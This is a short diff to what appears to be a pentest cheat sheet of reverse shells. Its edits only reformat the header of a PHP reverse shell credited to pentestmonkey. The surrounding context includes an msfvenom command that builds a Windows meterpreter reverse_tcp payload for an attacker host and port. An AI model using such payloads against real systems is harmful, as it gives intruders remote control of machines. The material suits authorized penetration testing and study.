@@ -420,9 +420,10 @@ system("/bin/bash");
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
 
-- php web shell
-shoutout to www.pentestmonkey.net
+- php web shell from www.pentestmonkey.net
+
 ```
+
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -466,7 +467,6 @@ shoutout to www.pentestmonkey.net
 // Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
 //
 // Usage
-// -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
 set_time_limit (0);
